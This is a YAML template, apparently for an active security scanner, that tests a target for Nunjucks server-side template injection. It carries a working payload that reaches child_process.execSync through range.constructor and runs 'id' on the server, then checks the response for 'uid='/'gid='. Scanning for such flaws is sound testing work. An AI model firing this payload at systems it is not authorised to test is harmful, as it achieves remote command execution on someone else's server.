id: patt-ssti-nunjucks-01-view
name: 'PATT ssti patt-ssti-nunjucks-01 via view'
severity: critical
type: active
tags:
  - ssti
  - patt
requires:
  - node
description: 'PATT Nunjucks RCE via range.constructor. [patt:patt-ssti-nunjucks-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/JavaScript.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      view:
        - '{{range.constructor("return global.process.mainModule.require(''child_process'').execSync(''id'')")()}}'
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
